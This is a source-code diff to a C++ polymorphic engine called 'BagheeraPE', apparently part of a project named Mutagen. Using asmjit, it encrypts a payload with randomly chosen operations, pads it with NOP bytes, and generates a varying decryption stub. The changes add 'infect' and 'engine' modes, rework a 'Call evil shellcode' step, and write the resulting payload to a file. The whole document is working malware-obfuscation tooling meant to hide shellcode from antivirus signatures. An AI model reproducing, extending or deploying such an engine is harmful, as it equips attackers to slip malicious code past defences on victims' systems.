@@ -6,6 +6,8 @@ using namespace asmjit;
 using namespace asmjit::x86;
 using namespace std;
 
+#include <iomanip>
+
 
 
 /**
@@ -58,7 +60,8 @@ void BagheeraPE::GeneratePrologue(x86::Assembler& a)
 
 
   // load the pointer to the output buffer
-  a.mov(regDst, rdi);  // mov  regDest, [ebp+0x8]
+  if (mode == MODE_ENGINE)
+    a.mov(regDst, rdi);  // mov  regDest, [ebp+0x8]
 }
 
 
@@ -130,8 +133,19 @@ void BagheeraPE::EncryptInputBuffer(unsigned char * lpInputBuffer, unsigned long
 
   dwLeftOver = dwAlignedSize - dwInputBuffer;
 
+  unsigned char *aligned_input_buffer = new unsigned char[dwAlignedSize];
+  for (int i = 0; i < dwAlignedSize; ++i)
+  {
+    if (i < dwInputBuffer)
+    aligned_input_buffer[i] = lpInputBuffer[i];
+    else
+      aligned_input_buffer[i] = '\x90';
+  }
+
+
+
   // cast input buffer pointer from char to long
-  unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(lpInputBuffer);
+  unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(aligned_input_buffer);
   
   // allocate memory for the output data (rounded to block size)
   if ( posix_memalign((void **)&diEncryptedData, BLOCK_SIZE, dwAlignedSize) ){
@@ -144,7 +158,7 @@ void BagheeraPE::EncryptInputBuffer(unsigned char * lpInputBuffer, unsigned long
 
   // randomly select the number of encryption instructions
   dwCryptOpsCount = dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr);
-  DEBUG2("number of encryption instructions:", dwCryptOpsCount);
+  //DEBUG2("number of encryption instructions:", dwCryptOpsCount);
 
   // allocate memory for an array which will record information about the sequence of encryption instructions
   diCryptOps = (int *)malloc(dwCryptOpsCount);
@@ -158,6 +172,7 @@ void BagheeraPE::EncryptInputBuffer(unsigned char * lpInputBuffer, unsigned long
   for (unsigned long i = 0; i < dwCryptOpsCount; i++){
     diCryptOps[i] = (int) rand()%4;
   }
+
 
   // encrypt the input data according to instructions just generated
   for (unsigned long i = 0; i < dwEncryptedBlocks; i++)
@@ -260,12 +275,14 @@ void BagheeraPE::GenerateDecryption(x86::Assembler& a)
   
 
   // write the decrypted block to the output buffer
-  a.mov(qword_ptr(regDst), regData);
   a.mov(qword_ptr(regSrc), regData);
+  if (mode == MODE_ENGINE)
+    a.mov(qword_ptr(regDst), regData);
 
   // update the pointers to the input and ouput buffers to point to the next block
   a.add(regSrc, imm(sizeof(unsigned long)));
-  a.add(regDst, imm(sizeof(unsigned long)));
+  if (mode == MODE_ENGINE)
+    a.add(regDst, imm(sizeof(unsigned long)));
 
   // decrement the loop counter (the number of blocks remaining to decrypt)
   a.dec(regSize);
@@ -283,7 +300,8 @@ void BagheeraPE::GenerateDecryption(x86::Assembler& a)
 
 void BagheeraPE::SetupOutputRegisters(unsigned long returnValue, x86::Assembler& a)
 {
-  a.mov(rax, imm(returnValue));
+  if (mode == MODE_ENGINE)
+    a.mov(rax, imm(returnValue));
   /*
   // if there are no output registers to set up, return
   if ((regOutput == NULL) || (dwCount == 0))
@@ -330,12 +348,13 @@ void BagheeraPE::GenerateEpilogue(unsigned long dwParamCount, x86::Assembler& a)
 
   
   // Call evil shellcode
-  shellcode = a.newLabel();
-  a.call(shellcode);
+  //shellcode = a.newLabel();
+  //a.call(shellcode);
 
   // return to the code which called our function; additionally adjust the stack by the size of the passed
   // parameters (by stdcall convention)
-  a.ret(0);
+  //if (mode == MODE_ENGINE)
+    //a.ret(0);
 }
 
 
@@ -379,11 +398,13 @@ void BagheeraPE::AppendEncryptedData(x86::Assembler& a)
 {
   unsigned long * lpdwEncryptedData = reinterpret_cast<unsigned long *>(diEncryptedData);
 
-  a.bind(shellcode);
+  //a.bind(shellcode);
   // place the encrypted data buffer at the end of the decryption function (in 4-unsigned char blocks)
   for (unsigned long i = 0; i < dwEncryptedBlocks; i++){
     a.dq(lpdwEncryptedData[i]);
   }
+  if (mode == MODE_ENGINE)
+    a.ret(0);
 }
 
 
@@ -403,7 +424,7 @@ void BagheeraPE::WriteToFile(void *lpcDecryptionProc, unsigned long dwDecryption
     fclose(hFile);
   }
 
-  cout << INFO_BANNER << "payload written to file: " << filename << endl;
+  cout << INFO_BANNER << ": payload written to file: " << filename << endl;
 }
 
 ///////////////////////////////////////////////////////////
@@ -427,6 +448,8 @@ int BagheeraPE::create( unsigned char * lpInputBuffer, unsigned long dwInputBuff
   code.init(rt.environment());  // Initialize code to match the JIT environment
   Assembler a(&code);           // Create and attach x86::Assembler to code
   code.setLogger(&logger);      // Attach the `logger` to `code` holder
+
+  mode = MODE_INFECT;
   
   FILE *logfile = fopen("log/asmjt.log", "w+");
 
@@ -436,7 +459,6 @@ int BagheeraPE::create( unsigned char * lpInputBuffer, unsigned long dwInputBuff
     ERROR("could not open asmjit.log file. redirecting log to stdout");
     logger.setFile(stdout);  // Set the standard output as the logger exit
   }
-
   
   //DEBUG("randomly select registers");
   SelectRegisters();
@@ -494,7 +516,10 @@ int BagheeraPE::create( unsigned char * lpInputBuffer, unsigned long dwInputBuff
   //DEBUG("assembling code and binding to a function");
   DecryptionProc lpPolymorphicCode;
   Error err = rt.add(&lpPolymorphicCode, &code);
-  if (err) return 1;                // Handle a possible error returned by AsmJit.
+  
+  // Handle a possible error returned by AsmJit.
+  if (err) 
+    return MUTAGEN_ERR_MEMORY;
 
   // this struct describes the allocated memory block
   //DEBUG("allocating memory for the execution of the function");
@@ -517,19 +542,21 @@ int BagheeraPE::create( unsigned char * lpInputBuffer, unsigned long dwInputBuff
   //posix_memalign((void **)&diOutput, pagesize, aligned_size*pagesize);
 
   //DEBUG("making the memory page(s) of the function executable");
+  /*
   if (mprotect(diOutput, dwOutputSize, PROT_EXEC|PROT_READ|PROT_WRITE) == -1){
     ERROR("could not make output buffer's page executable");
     exit(MUTAGEN_ERR_MEMORY);
   }
+  */
 
   // check that allocation was successful
   if (diOutput != NULL)
   {
     // copy the generated code of the decryption function
     //DEBUG("copying to memory the function code");
-    //memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
-    asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
-    memcpy(diOutput, buf.data(), buf.size());
+    memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
+    //asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
+    //memcpy(diOutput, buf.data(), buf.size());
 
 
 
@@ -625,6 +652,8 @@ int BagheeraPE::execute( unsigned char * lpInputBuffer, unsigned long dwInputBuf
   code.init(rt.environment());  // Initialize code to match the JIT environment
   Assembler a(&code);           // Create and attach x86::Assembler to code
   code.setLogger(&logger);      // Attach the `logger` to `code` holder
+
+  mode = MODE_ENGINE;
   
   FILE *logfile = fopen("log/asmjt.log", "w+");
 
@@ -723,9 +752,9 @@ int BagheeraPE::execute( unsigned char * lpInputBuffer, unsigned long dwInputBuf
   {
     // copy the generated code of the decryption function
     //DEBUG("copying to memory the function code");
-    //memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
-    asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
-    memcpy(diOutput, buf.data(), buf.size());
+    memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
+    //asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
+    //memcpy(diOutput, buf.data(), buf.size());
 
     //DEBUG("writing the code to a function");
     WriteToFile(diOutput, dwOutputSize);
@@ -746,15 +775,7 @@ int BagheeraPE::execute( unsigned char * lpInputBuffer, unsigned long dwInputBuf
     //DEBUG("calling function");
     unsigned long dwOutputSize = function(szOutputBuffer);
 
-    // display the decrypted text
-    printf("Payload (%lu) : %s\n", dwOutputSize, szOutputBuffer );
-    std::cout << "Payload (" << dwOutputSize << ") : ";
-    for (int i = 0; i < (int) dwOutputSize; ++i)
-     cout << hex << static_cast<unsigned>(szOutputBuffer[i]) << " "; 
-   cout<< endl;
-
-  
-    
+      
     rt.release(lpPolymorphicCode);
   }
   else
